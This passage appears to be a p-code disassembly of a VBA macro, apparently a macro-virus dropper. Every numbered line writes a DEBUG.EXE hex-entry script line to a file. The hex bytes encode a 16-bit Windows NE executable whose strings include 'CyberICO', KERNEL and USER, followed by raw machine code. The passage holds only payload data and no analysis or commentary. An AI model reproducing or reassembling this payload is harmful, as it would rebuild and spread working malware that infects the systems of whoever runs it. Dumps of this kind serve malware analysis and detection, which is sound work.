' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00"
' 	PrintItemNL 
' Line #638:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68"
' 	PrintItemNL 
' Line #639:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 69 73 20 70 72 6F 67 72 61 6D 20 72 65 71 75 69"
' 	PrintItemNL 
' Line #640:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 72 65 73 20 4D 69 63 72 6F 73 6F 66 74 20 57 69"
' 	PrintItemNL 
' Line #641:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 6E 64 6F 77 73 2E 0D 0A 24 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #642:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 4E 45 05 3C 9F 00 0F 00 00 00 00 00 02 03 02 00"
' 	PrintItemNL 
' Line #643:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 00 04 00 14 1A 00 01 00 00 00 02 00 02 00 02 00"
' 	PrintItemNL 
' Line #644:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 3D 00 40 00 50 00 85 00 8E 00 92 00 2E 01 00 00"
' 	PrintItemNL 
' Line #645:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 02 00 04 00 00 00 02 08 18 00 0C 01 00 00 0A 03"
' 	PrintItemNL 
' Line #646:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 1A 00 39 0C 50 1D 39 0C F6 00 94 02 51 0C 94 02"
' 	PrintItemNL 
' Line #647:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 04 00 0E 80 01 00 00 00 00 00 24 01 02 00 30 1C"
' 	PrintItemNL 
' Line #648:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01E0 2C 00 00 00 00 00 03 80 01 00 00 00 00 00 26 01"
' 	PrintItemNL 
' Line #649:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01F0 2F 00 30 1C 01 80 00 00 00 00 00 00 08 43 79 62"
' 	PrintItemNL 
' Line #650:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0200 65 72 49 43 4F 05 43 79 62 65 72 00 00 00 01 00"
' 	PrintItemNL 
' Line #651:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0210 08 00 00 06 4B 45 52 4E 45 4C 04 55 53 45 52 02"
' 	PrintItemNL 
' Line #652:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0220 FF 01 CD 3F 01 16 0A 01 CD 3F 01 18 0B 00 15 41"
' 	PrintItemNL 
' Line #653:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0230 20 6D 69 6E 69 6D 75 6D 20 41 70 70 6C 69 63 61"
' 	PrintItemNL 
' Line #654:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0240 74 69 6F 6E 00 00 09 45 58 43 49 54 50 52 4F 43"
' 	PrintItemNL 
' Line #655:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0250 02 00 15 4F 56 45 52 4C 41 50 50 45 44 57 49 4E"
' 	PrintItemNL 
' Line #656:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0260 44 4F 57 50 52 4F 43 31 01 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #657:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #658:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #659:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #660:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #661:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02B0 FF FF B0 FF 50 9A DD 01 3C 0B 33 ED 55 9A FF FF"
' 	PrintItemNL 
' Line #662:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02C0 00 00 0B C0 74 EC 8C 06 46 00 81 C1 00 01 72 E2"
' 	PrintItemNL 
' Line #663:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02D0 89 0E 10 00 89 36 12 00 89 3E 14 00 89 1E 16 00"
' 	PrintItemNL 
' Line #664:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02E0 8C 06 18 00 89 16 1A 00 9A FF FF 00 00 86 C4 A3"
' 	PrintItemNL 
' Line #665:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02F0 48 00 B4 30 2E F7 06 10 00 01 00 74 07 9A FF FF"
' 	PrintItemNL 
' Line #666:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0300 00 00 EB 02 CD 21 A3 4C 00 86 C4 A3 4A 00 2E F7"
' 	PrintItemNL 
' Line #667:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0310 06 10 00 01 00 75 05 B0 00 A2 4F 00 33 C0 50 9A"
' 	PrintItemNL 
' Line #668:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0320 FF FF 00 00 FF 36 14 00 9A FF FF 00 00 0B C0 74"
' 	PrintItemNL 
' Line #669:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0330 81 9A F0 00 18 00 9A D4 02 94 00 9A 56 04 99 00"
' 	PrintItemNL 
' Line #670:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0340 E8 43 07 FF 36 84 00 FF 36 82 00 FF 36 80 00 9A"
' 	PrintItemNL 
' Line #671:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0350 C4 00 9E 00 83 C4 06 50 9A CF 01 B2 00 B8 15 00"
' 	PrintItemNL 
' Line #672:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0360 E9 28 04 00 8C D8 90 45 55 8B EC 1E 8E D8 FF 36"
' 	PrintItemNL 
' Line #673:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0370 14 00 FF 36 12 00 FF 36 18 00 FF 36 16 00 FF 36"
' 	PrintItemNL 
' Line #674:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0380 1A 00 9A F0 08 BB 00 83 ED 02 8B E5 1F 5D 4D CB"
' 	PrintItemNL 
' Line #675:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0390 8C D8 90 45 55 8B EC 1E 8E D8 B8 00 35 2E F7 06"
' 	PrintItemNL 
' Line #676:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03A0 10 00 01 00 74 07 9A 5E 00 00 00 EB 02 CD 21 89"
' 	PrintItemNL 
' Line #677:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03B0 1E 32 00 8C 06 34 00 0E 1F B8 00 25 BA E6 04 2E"
' 	PrintItemNL 
' Line #678:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03C0 F7 06 10 00 01 00 74 07 9A 07 01 00 00 EB 02 CD"
' 	PrintItemNL 
' Line #679:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03D0 21 16 1F 8B 0E 1E 01 E3 29 8E 06 46 00 26 8B 36"
' 	PrintItemNL 
' Line #680:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03E0 2C 00 A1 20 01 8B 16 22 01 33 DB FF 1E 1C 01 73"
' 	PrintItemNL 
' Line #681:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03F0 03 E9 7A 01 A1 24 01 8B 16 26 01 BB 03 00 FF 1E"
' 	PrintItemNL 
' Line #682:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0400 1C 01 8E 06 46 00 26 8B 0E 2C 00 E3 3E 8E C1 33"
' 	PrintItemNL 
' Line #683:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0410 FF 26 80 3D 00 74 34 B9 0D 00 BE 24 00 F3 A6 74"
' 	PrintItemNL 
' Line #684:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0420 0B B9 FF 7F 33 C0 F2 AE 75 21 EB E5 06 1E 07 1F"
' 	PrintItemNL 
' Line #685:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0430 8B F7 BF 58 00 B1 04 AC 2C 41 72 0D D2 E0 92 AC"
' 	PrintItemNL 
' Line #686:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0440 2C 41 72 05 0A C2 AA EB EE 16 1F BE 28 01 BF 28"
' 	PrintItemNL 
' Line #687:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0450 01 E8 E2 00 BE 28 01 BF 28 01 E8 D9 00 BE 28 01"
' 	PrintItemNL 
' Line #688:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0460 BF 28 01 E8 D0 00 83 ED 02 8B E5 1F 5D 4D CB 8C"
' 	PrintItemNL 
' Line #689:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0470 D8 90 45 55 8B EC 1E 8E D8 33 C9 EB 2F 8C D8 90"
' 	PrintItemNL 
' Line #690:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0480 45 55 8B EC 1E 8E D8 B9 01 00 EB 20 8C D8 90 45"
' 	PrintItemNL 
' Line #691:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0490 55 8B EC 1E 8E D8 56 57 B9 00 01 EB 0F 8C D8 90"
' 	PrintItemNL 
' Line #692:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04A0 45 55 8B EC 1E 8E D8 56 57 B9 01 01 88 2E 8D 00"
' 	PrintItemNL 
' Line #693:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04B0 51 0A C9 75 1C BE 8A 02 BF 8A 02 E8 78 00 BE 28"
' 	PrintItemNL 
' Line #694:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04C0 01 BF 28 01 E8 6F 00 8B 76 06 56 E8 B8 05 83 C4"
' 	PrintItemNL 
' Line #695:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04D0 02 BE 28 01 BF 28 01 E8 5C 00 BE 28 01 BF 28 01"
' 	PrintItemNL 
' Line #696:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04E0 E8 53 00 E8 27 00 58 0A E4 75 17 8B 46 06 B4 4C"
' 	PrintItemNL 
' Line #697:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04F0 2E F7 06 10 00 01 00 74 07 9A 29 01 00 00 EB 02"
' 	PrintItemNL 
' Line #698:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0500 CD 21 5F 5E 83 ED 02 8B E5 1F 5D 4D CB 8B 0E 1E"
' 	PrintItemNL 
' Line #699:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0510 01 E3 07 BB 02 00 FF 1E 1C 01 1E C5 16 32 00 B8"
' 	PrintItemNL 
' Line #700:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0520 00 25 2E F7 06 10 00 01 00 74 07 9A 5A 02 00 00"
' 	PrintItemNL 
' Line #701:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0530 EB 02 CD 21 1F C3 3B F7 73 0E 83 EF 04 8B 05 0B"
' 	PrintItemNL 
' Line #702:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0540 45 02 74 F2 FF 1D EB EE C3 00 8C D8 90 45 55 8B"
' 	PrintItemNL 
' Line #703:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0550 EC 1E 8E D8 B8 FC 00 50 0E E8 A9 02 B8 FF 00 50"
' 	PrintItemNL 
' Line #704:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0560 0E E8 A1 02 83 ED 02 8B E5 1F 5D 4D CB 00 B8 02"
' 	PrintItemNL 
' Line #705:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0570 00 E9 17 02 8F 06 92 00 8F 06 94 00 B8 04 01 B9"
' 	PrintItemNL 
' Line #706:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0580 08 00 E8 BD 02 89 16 88 00 A3 86 00 52 50 FF 36"
' 	PrintItemNL 
' Line #707:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0590 14 00 52 50 B8 04 01 50 9A FF FF 00 00 5B 07 03"
' 	PrintItemNL 
' Line #708:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05A0 D8 26 C6 07 00 BA 01 00 BF 01 00 BE 81 00 8E 1E"
' 	PrintItemNL 
' Line #709:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05B0 46 00 AC 3C 20 74 FB 3C 09 74 F7 3C 0D 74 6F 0A"
' 	PrintItemNL 
' Line #710:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05C0 C0 74 6B 47 4E AC 3C 20 74 E8 3C 09 74 E4 3C 0D"
' 	PrintItemNL 
' Line #711:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05D0 74 5C 0A C0 74 58 3C 22 74 24 3C 5C 74 03 42 EB"
' 	PrintItemNL 
' Line #712:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05E0 E4 33 C9 41 AC 3C 5C 74 FA 3C 22 74 04 03 D1 EB"
' 	PrintItemNL 
' Line #713:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05F0 D3 8B C1 D1 E9 13 D1 A8 01 75 CA EB 01 4E AC 3C"
' 	PrintItemNL 
' Line #714:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0600 0D 74 2B 0A C0 74 27 3C 22 74 BA 3C 5C 74 03 42"
' 	PrintItemNL 
' Line #715:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0610 EB EC 33 C9 41 AC 3C 5C 74 FA 3C 22 74 04 03 D1"
' 	PrintItemNL 
' Line #716:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0620 EB DB 8B C1 D1 E9 13 D1 A8 01 75 D2 EB 97 16 1F"
' 	PrintItemNL 
' Line #717:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0630 89 3E 80 00 03 D7 47 D1 E7 03 D7 42 80 E2 FE 2B"
' 	PrintItemNL 
' Line #718:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0640 E2 8B C4 A3 82 00 8B D8 03 FB 16 07 C5 36 86 00"
' 	PrintItemNL 
' Line #719:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0650 36 89 37 43 43 36 8E 1E 46 00 BE 81 00 EB 03 33"
' 	PrintItemNL 
' Line #720:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0660 C0 AA AC 3C 20 74 FB 3C 09 74 F7 3C 0D 74 7C 0A"
' 	PrintItemNL 
' Line #721:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0670 C0 74 78 36 89 3F 43 43 4E AC 3C 20 74 E1 3C 09"
' 	PrintItemNL 
' Line #722:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0680 74 DD 3C 0D 74 62 0A C0 74 5E 3C 22 74 27 3C 5C"
' 	PrintItemNL 
' Line #723:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0690 74 03 AA EB E4 33 C9 41 AC 3C 5C 74 FA 3C 22 74"
' 	PrintItemNL 
' Line #724:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06A0 06 B0 5C F3 AA EB D1 B0 5C D1 E9 F3 AA 73 06 B0"
' 	PrintItemNL 
' Line #725:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06B0 22 AA EB C5 4E AC 3C 0D 74 2E 0A C0 74 2A 3C 22"
' 	PrintItemNL 
' Line #726:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06C0 74 B7 3C 5C 74 03 AA EB EC 33 C9 41 AC 3C 5C 74"
' 	PrintItemNL 
' Line #727:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06D0 FA 3C 22 74 06 B0 5C F3 AA EB D9 B0 5C D1 E9 F3"
' 	PrintItemNL 
' Line #728:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06E0 AA 73 96 B0 22 AA EB CD 33 C0 AA 16 1F C7 07 00"
' 	PrintItemNL 
' Line #729:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06F0 00 FF 2E 92 00 00 8C D8 90 45 55 8B EC 1E 8E D8"
' 	PrintItemNL 
' Line #730:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0700 1E 9A FF FF 00 00 0B C0 74 03 BA 00 00 8B DA 8E"
' 	PrintItemNL 
' Line #731:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0710 C2 33 C0 33 F6 33 FF B9 FF FF 0B DB 74 0E 26 80"
' 	PrintItemNL 
' Line #732:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0720 3E 00 00 00 74 06 F2 AE 46 AE 75 FA 8B C7 40 24"
' 	PrintItemNL 
' Line #733:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0730 FE 46 8B FE D1 E6 B9 09 00 E8 06 01 50 8B C6 E8"
' 	PrintItemNL 
' Line #734:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0740 00 01 A3 84 00 06 1E 07 1F 8B CF 8B D8 33 F6 5F"
' 	PrintItemNL 
' Line #735:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0750 49 E3 26 8B 04 36 3B 06 24 00 75 10 51 56 57 BF"
' 	PrintItemNL 
' Line #736:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0760 24 00 B9 06 00 F3 A7 5F 5E 59 74 05 26 89 3F 43"
' 	PrintItemNL 
' Line #737:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0770 43 AC AA 0A C0 75 FA E2 DA 26 89 0F 1F 83 ED 02"
' 	PrintItemNL 
' Line #738:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0780 8B E5 1F 5D 4D CB 16 1F B8 03 00 50 50 0E E8 B9"
' 	PrintItemNL 
' Line #739:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0790 FD 0E E8 70 00 0E E8 35 00 33 DB 0B C0 74 1D 8B"
' 	PrintItemNL 
' Line #740:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07A0 F8 B8 09 00 80 3D 4D 75 03 B8 0F 00 03 F8 57 1E"
' 	PrintItemNL 
' Line #741:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07B0 07 B0 0D B9 22 00 F2 AE 88 5D FF 58 53 1E 50 9A"
' 	PrintItemNL 
' Line #742:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07C0 FF FF 00 00 B8 FF 00 50 9A FF FF 00 00 00 8C D8"
' 	PrintItemNL 
' Line #743:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07D0 90 45 55 8B EC 1E 8E D8 56 57 1E 07 8B 56 06 BE"
' 	PrintItemNL 
' Line #744:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07E0 30 01 AD 3B C2 74 10 40 96 74 0C 97 33 C0 B9 FF"
' 	PrintItemNL 
' Line #745:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07F0 FF F2 AE 8B F7 EB EB 96 5F 5E 83 ED 02 8B E5 1F"
' 	PrintItemNL 
' Line #746:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0800 5D 4D CA 02 00 8C D8 90 45 55 8B EC 1E 8E D8 57"
' 	PrintItemNL 
' Line #747:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0810 83 3E 9C 00 00 74 1F FF 76 06 0E E8 B0 FF 0B C0"
' 	PrintItemNL 
' Line #748:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0820 74 14 92 8B FA 33 C0 B9 FF FF F2 AE F7 D1 49 8B"
' 	PrintItemNL 
' Line #749:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0830 1E 52 00 E8 55 02 5F 83 ED 02 8B E5 1F 5D 4D CA"
' 	PrintItemNL 
' Line #750:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0840 02 00 55 8B EC 53 06 51 B9 00 10 87 0E 96 00 51"
' 	PrintItemNL 
' Line #751:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0850 50 9A F2 07 E5 00 5B 8F 06 96 00 59 8C DA 0B C0"
' 	PrintItemNL 
' Line #752:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0860 74 04 07 5B EB 05 8B C1 E9 20 FF 8B E5 5D C3 00"
' 	PrintItemNL 
' Line #753:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0870 51 57 F6 47 02 01 74 63 E8 E7 00 8B FE 8B 04 A8"
' 	PrintItemNL 
' Line #754:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0880 01 74 03 2B C8 49 41 41 8B 77 04 0B F6 74 4C 03"
' 	PrintItemNL 
' Line #755:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0890 CE 73 09 33 C0 BA F0 FF E3 30 EB 3F 16 07 26 A1"
' 	PrintItemNL 
' Line #756:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08A0 96 00 3D 00 10 74 16 BA 00 80 3B D0 72 06 D1 EA"
' 	PrintItemNL 
' Line #757:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08B0 75 F8 EB 22 83 FA 08 72 1D D1 E2 8B C2 48 8B D0"
' 	PrintItemNL 
' Line #758:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08C0 03 C1 73 02 33 C0 F7 D2 23 C2 52 E8 2E 00 5A 73"
' 	PrintItemNL 
' Line #759:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08D0 0D 83 FA F0 74 05 B8 10 00 EB E2 F9 EB 1B 8B D0"
' 	PrintItemNL 
' Line #760:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08E0 2B 57 04 89 47 04 89 7F 0A 8B 77 0C 4A 89 14 42"
' 	PrintItemNL 
' Line #761:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 08F0 03 F2 C7 04 FE FF 89 77 0C 5F 59 C3 8B D0 F6 47"
' 	PrintItemNL 
' Line #762:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0900 02 04 74 02 EB 51 52 51 53 8B 77 06 2E 8B 1E 10"
' 	PrintItemNL 
' Line #763:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0910 00 33 C9 0B D2 75 07 F7 C3 10 00 75 40 41 B8 02"
' 	PrintItemNL 
' Line #764:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0920 00 F7 C3 01 00 75 03 B8 20 00 56 51 52 50 9A FF"
' 	PrintItemNL 
' Line #765:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0930 FF 00 00 0B C0 74 26 3B C6 75 1C 56 9A FF FF 00"
' 	PrintItemNL 
' Line #766:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0940 00 0B D0 74 12 5B 59 5A 8B C2 F6 47 02 04 74 04"
' 	PrintItemNL 
' Line #767:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0950 4A 89 57 FE F8 EB 0A B8 12 00 E9 2E FE 5B 59 5A"
' 	PrintItemNL 
' Line #768:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0960 F9 C3 57 8B 77 0A 3B 77 0C 75 03 8B 77 08 AD 83"
' 	PrintItemNL 
' Line #769:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0970 F8 FE 74 08 8B FE 24 FE 03 F0 EB F2 4F 4F 8B F7"
' 	PrintItemNL 
' Line #770:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0980 5F C3 45 55 8B EC 1E 8B 46 06 A3 98 00 C7 06 9A"
' 	PrintItemNL 
' Line #771:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0990 00 00 00 8D 66 FE 1F 5D 4D CB 45 55 8B EC 1E B8"
' 	PrintItemNL 
' Line #772:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09A0 FD 43 BA 03 00 52 50 FF 36 9A 00 FF 36 98 00 9A"
' 	PrintItemNL 
' Line #773:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09B0 2E 07 B4 05 05 C3 9E 83 D2 26 A3 98 00 89 16 9A"
' 	PrintItemNL 
' Line #774:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09C0 00 8B C2 80 E4 7F 8D 66 FE 1F 5D 4D CB 90 55 8B"
' 	PrintItemNL 
' Line #775:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09D0 EC 8B 46 08 8B 4E 0C 0B C8 8B 4E 0A 75 09 8B 46"
' 	PrintItemNL 
' Line #776:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 09E0 06 F7 E1 5D CA 08 00 53 F7 E1 8B D8 8B 46 06 F7"
